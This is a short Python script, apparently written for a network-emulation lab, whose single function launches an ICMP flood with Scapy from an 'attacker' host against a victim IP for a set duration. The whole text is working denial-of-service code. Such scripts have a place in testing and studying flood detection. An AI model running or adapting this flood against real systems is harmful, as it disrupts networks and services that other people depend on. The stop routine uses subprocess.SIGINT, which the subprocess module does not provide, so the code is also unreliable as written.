from scapy.all import Ether, IP, ICMP, sendp
import time
import subprocess

def run_attack(attacker_host, victim_ip, duration):
    print(f"Starting ICMP Flood from {attacker_host.name} to {victim_ip} for {duration} seconds.")
    scapy_cmd = f"from scapy.all import *; sendp(Ether()/IP(dst='{victim_ip}')/ICMP(), loop=1, inter=0.001, verbose=0)"
    process = attacker_host.popen(f'python3 -c "{scapy_cmd}"', shell=True)
    
    time.sleep(duration)
    process.send_signal(subprocess.SIGINT) # Attempt to stop Scapy processes gracefully
    process.wait() # Wait for the process to terminate
    print(f"ICMP Flood from {attacker_host.name} to {victim_ip} finished.")